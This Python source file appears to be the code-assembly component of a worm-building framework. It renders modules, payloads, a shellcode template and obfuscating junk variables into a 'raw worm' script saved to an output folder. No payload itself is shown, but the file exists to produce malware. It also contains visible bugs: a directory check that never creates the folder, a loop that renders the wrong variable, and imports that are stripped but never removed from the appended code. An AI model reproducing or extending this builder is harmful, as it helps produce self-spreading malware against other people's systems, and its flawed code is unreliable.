import os
import base64
from typing import Union
from jinja2 import Template

from .tools.payloader import Payloader
from .tools.starter import Starter
from .tools.shadow import Shadow
from .tools.garbage_man_var import GarbageMan
from .tools.pay_builder import PayloadBuilder

from .tools.pay_builder2 import PayloadBuilder2

from .tools.coder_template_tools.master_tool import MasterTempTool
from .tools.coder_template_tools.master_gen_tool import MasterGenTools


class RawCode:
    def __init__(self, coder: object, lang: str):
        self.coder = coder
        self.msg = self.coder.msg
        # language type
        self.lang = lang
        
        self._code = ""
        self._py_imports = set()
    
    @property
    def code(self) -> str:
        return self._code
    
    @property
    def imports(self) -> list:
        match self.lang:
            case "py":
                return list(self._py_imports)
            case _:
                return []
        
    def add_code(self, code: str) -> None:
        match self.lang:
            case "py":
                fcode, imp = self.separate_py_code(code)
                self.add_imports(imp)
                self._code += code
            case _:
                self._code += code
        
        
    
    def add_imports(self, imports: Union[list, tuple, set], types: str = "py") -> None:
        match types:
            case "py":
                imp = self._py_imports
            case _:
                return
        for i in imports:
            imp.add(i)
    
    def separate_py_code(self, code: str) -> tuple:
        fcode = ""
        imp = []
        for line in code.split("\n"):
            if line.startswith("import") or line.startswith("from"):
                imp.append(line)
            else:
                fcode += line + "\n"
        return (fcode, imp)





class Coder:
    def __init__(self, queen: object, worm_builder: object):
        self.queen = queen
        self.msg = self.queen.msg
        self.WB = worm_builder
        self.dir_out = self.queen.dir_hive_out
        self.raw_worm_dir_name = None
        self.raw_worm_file_path = None
        self.global_var = {}
        self.payloader = Payloader(self.queen, self)
        self.starter = Starter(self)
        self.shadow = Shadow(self)
        self.garbage_man = GarbageMan(self)
        self.temp_tools = MasterTempTool(self)
        self.gen_temp_tools = MasterGenTools(self)
        
 
    @property
    def var(self) -> dict:
        return self._variables()
    
    @property
    def globalVar(self) -> dict:
        gv = self.global_var.copy()
        gv.update(self.WB.globalVar)
        return gv
    
    @property
    def imports(self) -> list:
        return self._imports()
    
    @property
    def icon(self) -> Union[str, None]:
        return self.WB.icon
    
    def get_owner(self, name: str) -> object:
        item = self.WB.get_worm_item(name)
        if not item:
            return self.WB.raw_worm.master_worm
        else:
            return item
    
    
    def _variables(self) -> dict:
        var = {}
        var["MODULES"] = self.prepare_mod_list()
        var["WORM_NAME"] = self.WB.name
        var["_MODULES"] = self.imports
        for name, var_obj in self.WB.var.items():
            var[name] = var_obj.value
        for name, food in self.WB.raw_worm.reqFood.items():
            var[name] = food.value
        for name, gar_v in self.WB.raw_worm.garbageVar.items():
            var[name] = self.garbage_man.generate(gar_v)
        pb2 = PayloadBuilder2(self.queen, self)
        for name, pay in self.WB.raw_worm.payloads.items():
            ## test new system
            if pay.payload_new:
                var[name] = pb2.process(pay, name, self.get_owner(pay.owner), var)
            else:
                pb = PayloadBuilder(self.queen, self)
                payload = pb.process(pay, name, var, self.get_owner(pay.owner).payStep)
                var[name] = payload
        for name in self.WB.raw_worm.reqPayload.keys():
            if self.WB.raw_worm.master_worm.lang == "asm":
                var[name] = ""
            else:
                var[name] = "''"
        return var
    
    def prepare_mod_list(self) -> str:
        mods = []
        for mod in self.WB.raw_worm.modules.values():
            if mod.subTypes == "mod_loader":
                continue
            mods.append(mod.name)
        out = "{"
        for mod in mods:
            out += f"'{mod}':{mod}, "
        out += "}"
        return out
    
    def return_code(self, code: Union[str, object], return_imports: bool = False) -> str:
        if isinstance(code, str):
            raw = code
        else:
            raw = code.raw_code
        fcode = []
        for line in raw.split("\n"):
            if line.startswith("import") or line.startswith("from"):
                if return_imports:
                    fcode.append(line)
                else:
                    continue
            else:
                fcode.append(line)
        return "\n".join(fcode)
    
    def return_imports(self, code: Union[str, object], use_return_imports_FLAG: bool = False) -> list:
        if isinstance(code, str):
            raw = code
            flag = False
        else:
            raw = code.raw_code
            if use_return_imports_FLAG:
                flag = code.import_FLAG
            else:
                flag = False
        imp = []
        if flag:
            return imp
        for line in raw.split("\n"):
            if line.startswith("import") or line.startswith("from"):
                imp.append(line)
        return imp
    
    def render_single_str(self, code: str, var: dict = {}) -> str:
        code = Template(code)
        code = code.render(var)
        return code
    




    def render_single(self, mod: Union[str, object], var: dict = None) -> str:
        if not var:
            var = self.var
        if isinstance(mod, str):
            raw = self.return_code(mod)
            return raw
        code = self.return_code(mod, mod.import_FLAG)
        if mod.render_FLAG:
            code = Template(code)
            code = code.render(**var, TOOL=self.temp_tools, GTOOL=self.gen_temp_tools)
        return code

    # New render
    def render_single_template(self, code_temp: str, var: dict = {}):
        try:
            code = Template(code_temp)
            code = code.render(**var, TOOL=self.temp_tools, GTOOL=self.gen_temp_tools)
            return code
        except Exception as e:
            self.msg("error", f"[!!] ERROR render template: {e} [!!]")
            return code_temp
    


    
        
    
    def raw_code(self, var: dict = None) -> str:
        if not var:
            var = self.var
        codes = []
        for mod in self.WB.raw_worm.modules.values():
            # exclusion loaders
            if mod.subTypes == "mod_loader":
                continue
            if mod.subTypes == "dll":
                continue
            elif mod.subTypes == "lib":
                continue
            codes.append(self.render_single(mod, var))
        for smod in self.WB.raw_worm.support.values():
            if smod.subTypes == "dll":
                continue
            elif smod.subTypes == "lib":
                continue
            codes.append(self.render_single(smod, var))
        # shellcode template
        scode = self.WB.raw_worm.scode
        if scode:
            codes.append(self.render_single(scode, var))
        codes.append(self.render_single(self.WB.raw_worm.master_worm, var))
        return "\n".join(codes)
    
    def _imports(self) -> list:
        imp = set()
        for mod in self.WB.items:
            if mod.no_extract_FLAG:
                continue
            for i in self.return_imports(mod, use_return_imports_FLAG=False):
                imp.add(i)
        return list(imp)



       
    def save_raw_worm(self, code: str, name: str = None, file_ext: str = ".py") -> None:
        if not name:
            name = self.WB.name
        self.raw_worm_dir_name = os.path.join(self.dir_out, name)
        self.raw_worm_file_path = os.path.join(self.raw_worm_dir_name, f"{name}{file_ext}")
        if not self.raw_worm_dir_name:
            os.mkdir(self.raw_worm_dir_name)
        with open(self.raw_worm_file_path, "w") as file:
            file.write(code)
        self.msg("msg", f"Save raw worm: '{name}{file_ext}' successful.")
    

    

        
    def code_worm_base(self, var: dict = None, options: dict = {}) -> str:
        if not var:
            var = self.var
        imp_FLAG = options.get("INCLUDE_IMPORTS")
        code = RawCode(self, self.WB.lang)
        # this modules is not append to final code
        no_accept = ["dll", "lib", "mod_loader"]
        for mod in self.WB.raw_worm.modules.values():
            if mod.subTypes in no_accept:
                continue
            mod_code = self.render_single(mod, var)
            code.add_code(mod_code)
        for smod in self.WB.raw_worm.support.values():
            if smod.subTypes in no_accept:
                continue
            mod_code = self.render_single(mod, var)
            code.add_code(mod_code)
        # shellcode template
        scode = self.WB.raw_worm.scode
        if scode:
            mod_code = self.render_single(scode, var)
            code.add_code(mod_code)
        # add master worm code
        master_code = self.render_single(self.WB.raw_worm.master_worm, var)
        code.add_code(master_code)

        
        if imp_FLAG:
            worm_code = "\n".join(self.imports)
        else:
            worm_code = ""
        
        worm_code += "\n".join(code.imports) + "\n" + code.code
        wcode = Template(worm_code)
        wcode = wcode.render(**var, TOOL=self.temp_tools)
        wcode = self.clear_garbage_imports(wcode)

        return wcode
        

    def clear_garbage_imports(self, code: str) -> str:
        imp = set()
        rcode = ""
        for line in code.split("\n"):
            if line.startswith("import") or line.startswith("from"):
                imp.add(line)
            else:
                rcode += "\n" + line
        code = "\n".join(imp) + "\n" + rcode
        return code


        

